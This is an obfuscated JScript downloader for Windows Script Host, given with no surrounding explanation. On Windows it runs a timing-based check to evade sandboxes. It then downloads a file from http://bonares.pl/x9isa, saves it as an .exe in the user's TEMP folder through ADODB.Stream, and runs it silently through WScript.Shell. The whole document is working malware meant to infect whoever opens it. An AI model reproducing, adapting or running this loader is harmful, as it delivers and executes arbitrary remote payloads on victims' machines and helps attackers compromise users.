var _F = false;
var _MR = "CreateObject";
var _RN = function _HC() {return WScript[_MR]("WScript"+".Shell");}(), _LE = 11;
var _JN = "MSXML2.XMLHTTP";
var _I = 2123213;
var _PB = 0;
function _M(_SH){_RN["Run"](_SH, _PB, _PB);};
function _V(){return _JN + "";};
function _MS(_DC, _T1){_PB = _PB * 1; return _DC - _T1;};
function _RD(){return _MR;};
/*@cc_on
  @if (@_win32 || @_win64)
    _F = true;
  @end
@*/
if (_F)
{
var _N = "";
function _ZV(){return 22;};
var _LH = 0; var _C = 0;
function _Q()
{
var _MY = new this["Date"]();
var _CV = _MY["getUTCMilliseconds"]();
WScript["Sleep"](_ZV());
var _MY = new this["Date"]();
var _QK = _MY["getUTCMilliseconds"]();
WScript["Sleep"](_ZV());
var _MY = new this["Date"]();
var _K = _MY["getUTCMilliseconds"]();
var _LH = "_MF";
_LH = _MS(_QK, _CV);
var _C = "_GV";
_C = _MS(_K, _QK);
_N = "open";
return _MS(_LH, _C);
}
var _EK = false;
var _D0 = false;
for (var _ZB = _PB; _ZB < _ZV() * 1; _ZB++){if (_Q() != _PB){
_EK = true; 
_C = "31" + 11 * _LH + _C; 
_D0 = true; 
break;
}}
function _MZ() {return ((_EK == true) && (_EK == _D0)) ? 1 : _PB;};
if (_EK && _MZ() && _D0){
function _S() {return _RN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8PVvoGTq.ex" + "e";};
 _D1 = _V();
 _M0 = WScript[_MR](_D1);
 var _X0 = 1;
 while (_X0){
try {
	if (_X0 == 1)
	{
		_M0[_N]("GET", "http://bonares.pl/x9isa", false);
		_M0["send"]();
		_Y = "Sleep";
	}
	WScript[_Y](_ZV() + 120); 
	if (_M0["readystate"] < 2 * 2) continue;
	_X0 = _PB;
	function _T(_FC) {var _D = (1, 2, 3, 4, 5, _FC); return _D;};
	_PT = WScript[_RD()]("ADODB.Stream");
	_D1 = _PT;
	_D1[_N]();
	_D1["type"] = _T(1);
	_D1["write"](_M0["ResponseBody"]);
	_PT["position"] = _T(_PB);
	_D1["Save" + "ToFile"](_S(), 2);
	_PT["cl"+"ose"]();
	_X = _S();
	_M(_X);
} catch(_T0){};
}
}
}

